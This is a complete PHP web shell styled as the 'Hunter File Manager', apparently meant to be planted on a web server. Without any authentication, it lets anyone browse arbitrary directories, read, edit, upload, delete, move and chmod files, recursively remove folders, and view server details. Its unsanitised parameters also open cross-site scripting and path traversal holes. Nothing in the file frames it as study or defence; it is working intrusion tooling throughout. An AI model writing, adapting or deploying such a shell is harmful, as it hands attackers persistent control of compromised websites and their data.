<?php
error_reporting(0);
set_time_limit(0);

if (empty($_GET['dir'])) {
    $dir = getcwd();
} else {
    $dir = $_GET['dir'];
}

chdir($dir);
$current = htmlentities($_SERVER['PHP_SELF'] . "?dir=" . $dir);

// Handle file operations (delete, copy, move, rename, edit, chmod)
$mode = $_GET['mode'];

switch ($mode) {
    case 'delete':
        $file = $_GET['file'];
        if (unlink($file)) {
            echo $file . " deleted successfully.<p>";
        } else {
            echo "Unable to delete " . $file . ".<p>";
        }
        break;
    case 'copy':
        $src = $_GET['src'];
        $dst = $_POST['dst'];
        if (empty($dst)) {
            echo "<form action='" . $current . "&mode=copy&src=" . $src . "' method='POST'>";
            echo "Destination: <input name='dst'><br>";
            echo "<input type='submit' value='Copy'></form>";
        } else {
            if (copy($src, $dst)) {
                echo "File copied successfully.<p>";
            } else {
                echo "Unable to copy " . $src . ".<p>";
            }
        }
        break;
    case 'move':
        $src = $_GET['src'];
        $dst = $_POST['dst'];
        if (empty($dst)) {
            echo "<form action='" . $current . "&mode=move&src=" . $src . "' method='POST'>";
            echo "Destination: <input name='dst'><br>";
            echo "<input type='submit' value='Move'></form>";
        } else {
            if (rename($src, $dst)) {
                echo "File moved successfully.<p>";
            } else {
                echo "Unable to move " . $src . ".<p>";
            }
        }
        break;
    case 'rename':
        $old = $_GET['old'];
        $new = $_POST['new'];
        if (empty($new)) {
            echo "<form action='" . $current . "&mode=rename&old=" . $old . "' method='POST'>";
            echo "New name: <input name='new'><br>";
            echo "<input type='submit' value='Rename'></form>";
        } else {
            if (rename($old, $new)) {
                echo "File/Directory renamed successfully.<p>";
            } else {
                echo "Unable to rename " . $old . ".<p>";
            }
        }
        break;
    case 'upload':
        $temp = $_FILES['upload_file']['tmp_name'];
        $file = basename($_FILES['upload_file']['name']);
        if (!empty($file)) {
            if (move_uploaded_file($temp, $file)) {
                echo "File uploaded successfully.<p>";
                unlink($temp);
            } else {
                echo "Unable to upload " . $file . ".<p>";
            }
        }
        break;
    case 'create_file':
        $new_file = $_POST['new_file'];
        if (file_put_contents($new_file, '') !== false) {
            echo "File created successfully.<p>";
        } else {
            echo "Unable to create file.<p>";
        }
        break;
    case 'create_folder':
        $new_folder = $_POST['new_folder'];
        if (mkdir($new_folder)) {
            echo "Folder created successfully.<p>";
        } else {
            echo "Unable to create folder.<p>";
        }
        break;
    case 'edit':
        $file = $_GET['file'];
        if (isset($_POST['file_content'])) {
            if (file_put_contents($file, $_POST['file_content'])) {
                echo "File saved successfully.<p>";
            } else {
                echo "Unable to save the file.<p>";
            }
        } else {
            $file_content = file_get_contents($file);
            echo "<form action='" . $current . "&mode=edit&file=" . $file . "' method='POST'>";
            echo "<textarea name='file_content' rows='10' cols='50'>" . htmlspecialchars($file_content) . "</textarea><br>";
            echo "<input type='submit' value='Save Changes'>";
            echo "</form>";
        }
        break;
    case 'chmod':
        $file = $_GET['file'];
        $permissions = $_POST['permissions'];
        if (isset($permissions)) {
            if (chmod($file, octdec($permissions))) {
                echo "Permissions changed successfully.<p>";
            } else {
                echo "Unable to change permissions.<p>";
            }
        } else {
            $current_permissions = substr(sprintf('%o', fileperms($file)), -4);
            echo "<form action='" . $current . "&mode=chmod&file=" . $file . "' method='POST'>";
            echo "Current Permissions: " . $current_permissions . "<br>";
            echo "New Permissions (e.g., 755): <input type='text' name='permissions' value='" . $current_permissions . "'><br>";
            echo "<input type='submit' value='Change Permissions'>";
            echo "</form>";
        }
        break;
    case 'rmdir':
        $rm = $_GET['rm'];

        // Function to delete a directory and its contents
        function deleteDirectory($dir) {
            // Make sure the directory exists
            if (!is_dir($dir)) {
                return false;
            }

            // Open the directory and read its contents
            $items = array_diff(scandir($dir), array('.', '..'));

            foreach ($items as $item) {
                $itemPath = $dir . DIRECTORY_SEPARATOR . $item;

                // If it's a directory, recursively call deleteDirectory to remove its contents
                if (is_dir($itemPath)) {
                    deleteDirectory($itemPath);
                } else {
                    // If it's a file, delete it
                    unlink($itemPath);
                }
            }

            // After clearing the directory, remove the directory itself
            return rmdir($dir);
        }

        // Try to delete the directory
        if (deleteDirectory($rm)) {
            echo "Directory removed successfully.<p>";
        } else {
            echo "Unable to remove directory: " . $rm . ". Make sure it's empty.<p>";
        }
        break;
}

clearstatcache();

echo "<div class='container'>";  // Wrapping all content inside a container with 90% width
echo "<div class='header'>";
echo "<h1>一═デ︻ Hunter File Manager ︻デ═一</h1>"; // The Title Added here
echo "<p>Server: " . $_SERVER['SERVER_NAME'] . "<br>";
echo "Current Directory: " . getcwd() . "<br>";
echo "Software: " . $_SERVER['SERVER_SOFTWARE'] . "</p>";
echo "</div>";

// Display file and folder actions
echo "<table>";
echo "<thead>";
echo "<tr><th>Name</th><th>Size</th><th>Delete</th><th>Copy</th><th>Move</th><th>Rename</th><th>Edit</th><th>Chmod</th></tr>";
echo "</thead><tbody>";

$files = scandir($dir);
foreach ($files as $file) {
    if (is_dir($file)) {
        $items = scandir($file);
        $items_num = count($items) - 2;
        echo "<tr><td><a href='" . $current . "/" . $file . "'>" . $file . "</a></td>";
        echo "<td>" . $items_num . " Items</td>";
        echo "<td><a href='" . $current . "&mode=rmdir&rm=" . $file . "'>Remove directory</a></td>";
        echo "<td>-</td><td>-</td><td><a href='" . $current . "&mode=rename&old=" . $file . "'>Rename directory</a></td>";
        echo "<td>-</td><td><a href='" . $current . "&mode=chmod&file=" . $file . "'>Chmod</a></td></tr>";
    }
}

foreach ($files as $file) {
    if (is_file($file)) {
        $size = round(filesize($file) / 1024, 2);
        echo "<tr><td>" . $file . "</td>";
        echo "<td>" . $size . " KB</td>";
        echo "<td><a href='" . $current . "&mode=delete&file=" . $file . "'>Delete</a></td>";
        echo "<td><a href='" . $current . "&mode=copy&src=" . $file . "'>Copy</a></td>";
        echo "<td><a href='" . $current . "&mode=move&src=" . $file . "'>Move</a></td>";
        echo "<td><a href='" . $current . "&mode=rename&old=" . $file . "'>Rename</a></td>";
        echo "<td><a href='" . $current . "&mode=edit&file=" . $file . "'>Edit</a></td>";
        echo "<td><a href='" . $current . "&mode=chmod&file=" . $file . "'>Chmod</a></td></tr>";
    }
}

echo "</tbody></table>";

// Form for uploading, creating files, and creating folders
echo "<div class='form-container'>";
echo "<form action='" . $current . "&mode=upload' method='POST' ENCTYPE='multipart/form-data'>";
echo "<input type='file' name='upload_file' class='form-input'><input type='submit' value='Upload File' class='form-btn'>";
echo "</form>";

echo "<form action='" . $current . "&mode=create_file' method='POST'>";
echo "<input type='text' name='new_file' placeholder='New File Name' class='form-input' required>";
echo "<input type='submit' value='Create File' class='form-btn'>";
echo "</form>";

echo "<form action='" . $current . "&mode=create_folder' method='POST'>";
echo "<input type='text' name='new_folder' placeholder='New Folder Name' class='form-input' required>";
echo "<input type='submit' value='Create Folder' class='form-btn'>";
echo "</form>";
echo "</div>";

echo "</div>";
?>

<html>
    <title>ok</title>
    <audio autoplay> <source src="https://www.soundjay.com/buttons/sounds/button-11.mp3" type="audio/mpeg"></audio>
	
<style>
    .container {
        width: 90%;
        margin: 0 auto;
    }

    .header h1 {
        text-align: center;
        color: #16a085;
    }

    .form-container {
        display: flex;
        justify-content: space-between;
        margin-top: 20px;
        flex-wrap: wrap;
    }

    .form-input {
        padding: 5px;
        margin: 5px;
        font-size: 14px;
        width: 150px;
    }

    .form-btn {
        padding: 5px 10px;
        font-size: 14px;
        background-color: #16a085;
        color: white;
        border: none;
        cursor: pointer;
    }

    .form-btn:hover {
        background-color: #1abc9c;
    }

    table {
        width: 100%;
        margin: 20px 0;
        border-collapse: collapse;
    }

    table, th, td {
        border: 1px solid #7f8c8d;
    }

    th, td {
        padding: 10px;
        text-align: center;
    }

    th {
        background-color: #16a085;
        color: white;
    }

    td a {
        color: #1abc9c;
        text-decoration: none;
    }

    td a:hover {
        color: #e74c3c;
    }
</style>
